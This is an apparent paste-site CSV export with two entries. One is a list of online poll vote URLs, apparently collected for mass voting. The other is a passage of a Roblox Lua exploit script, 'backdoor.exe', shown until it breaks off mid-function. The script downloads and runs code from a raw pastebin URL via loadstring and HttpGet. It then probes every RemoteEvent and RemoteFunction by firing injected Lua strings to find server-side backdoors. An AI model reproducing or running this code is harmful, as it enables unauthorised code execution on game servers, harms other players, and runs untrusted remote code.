id,title,username,language,date,content
Y0hbtgGA,last one,vuseless,HTML,Friday 30th of June 2023 07:03:26 PM CDT,"onlinepoll.me/en/poll/vote/who-do-you-eliminate-35
onlinepoll.me/en/poll/vote/who-do-you-eliminate-34
onlinepoll.me/en/poll/vote/who-do-you-eliminate-31
onlinepoll.me/en/poll/vote/who-do-you-eliminate-22
onlinepoll.me/en/poll/vote/who-do-you-eliminate-13
onlinepoll.me/en/poll/vote/who-do-you-eliminate-36
onlinepoll.me/en/poll/vote/who-do-you-eliminate-26
onlinepoll.me/en/poll/vote/who-do-you-eliminate-11
onlinepoll.me/en/poll/vote/who-do-you-eliminate-16
onlinepoll.me/en/poll/vote/who-do-you-eliminate-10
onlinepoll.me/en/poll/vote/who-do-you-eliminate-25
onlinepoll.me/en/poll/vote/who-do-you-eliminate-21
onlinepoll.me/en/poll/vote/who-do-you-eliminate-39
onlinepoll.me/en/poll/vote/who-do-you-eliminate-15
onlinepoll.me/en/poll/vote/who-do-you-eliminate-12
onlinepoll.me/en/poll/vote/who-do-you-eliminate-37
onlinepoll.me/en/poll/vote/who-do-you-eliminate-18
onlinepoll.me/en/poll/vote/who-do-you-eliminate-23
onlinepoll.me/en/poll/vote/who-do-you-eliminate-14
onlinepoll.me/en/poll/vote/who-do-you-eliminate-40
onlinepoll.me/en/poll/vote/who-do-you-eliminate-32
onlinepoll.me/en/poll/vote/who-do-you-eliminate-24
onlinepoll.me/en/poll/vote/who-do-you-eliminate-27
onlinepoll.me/en/poll/vote/who-do-you-eliminate-19
onlinepoll.me/en/poll/vote/who-do-you-eliminate-29
onlinepoll.me/en/poll/vote/who-do-you-eliminate-20
onlinepoll.me/en/poll/vote/who-do-you-eliminate-17
onlinepoll.me/en/poll/vote/who-do-you-eliminate-28
onlinepoll.me/en/poll/vote/who-do-you-eliminate-30
onlinepoll.me/en/poll/vote/who-do-you-eliminate-38"
fuh7NnfZ,Fix Backdoor.exe script,A_GUES,Lua,Friday 30th of June 2023 06:25:52 PM CDT,"-- Services
local Players = game:GetService(""Players"")
local CoreGui = game:GetService(""CoreGui"")
local Lighting = game:GetService(""Lighting"");
local Workspace = game:GetService(""Workspace"");
local JointsService = game:GetService(""JointsService"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local RobloxReplicatedStorage = game:GetService(""RobloxReplicatedStorage"")

-- Variables
local LocalPlayer = Players.LocalPlayer
local RobloxGui = CoreGui.RobloxGui

-- Functions
local dateTimeNow = DateTime.now
local tableFind = table.find
local taskSpawn = task.spawn
local taskWait = task.wait
local stringRep = string.rep
local mathRandom = math.random

-- Globals
local attached = false;
local backdoor = nil;
local commonPlaces = {
	ReplicatedStorage,
	Workspace,
	Lighting
};
local remoteCodes = {};

-- Constants
local INV_CODE = ""xJHCqm84cW"";
local STRING_VALUE_NAME = mathRandom(1000000, 9999999);


if RobloxGui:FindFirstChild(""V6"") then RobloxGui:FindFirstChild(""V6""):Destroy(); print(""Refreshed""); end
local Variables = loadstring(game:HttpGet(""https://pastebin.com/raw/UqD10SPV""))()

Variables.UI.Main.Active = true
Variables.UI.Main.Draggable = true

local function notify(text,cb,b1,b2)
	game:GetService(""StarterGui""):SetCore(
		""SendNotification"",{
			Title = ""backdoor.exe"",
			Duration = 3,
			Text = text,
			Callback = cb,
			Button1 = b1,
			Button2 = b2
		}
	)
end

local function validRemote(rm)
	local Parent = rm.Parent
	local class = rm.ClassName
	if class ~= ""RemoteEvent"" and class ~= ""RemoteFunction"" then return false end

	if Parent then
		if Parent == JointsService then return false end
		if (Parent == ReplicatedStorage and rm:FindFirstChild(""__FUNCTION"")) or
        (rm.Name == ""__FUNCTION"" and Parent.ClassName == ""RemoteEvent"" and Parent.Parent == ReplicatedStorage) then return false end
	end

	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end

	return true
end

local function scanDescendants(parent)
	local descendance = parent:GetDescendants();
	for i=1, #descendance do
		local descendant = descendance[i];


		if not validRemote(descendant) then continue; end
		
		--if #remoteCodes == 5 then remoteCodes.clear(); end
		local remoteCode = tostring(mathRandom(100000, 999999));
		remoteCodes[remoteCode] = descendant;
		
		local remoteClass = descendant.ClassName
		local requireScript = (""i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'""):format(STRING_VALUE_NAME, remoteCode)

		if remoteClass == ""RemoteEvent"" then
			descendant:FireServer(requireScript)

		elseif remoteClass == ""RemoteFunction"" then
			local waiting = true
			taskSpawn(function()
				descendant:InvokeServer(requireScript)
				waiting = nil
			end)

            -- If RemoteFunction don't respond in 1 second, we skip this one.
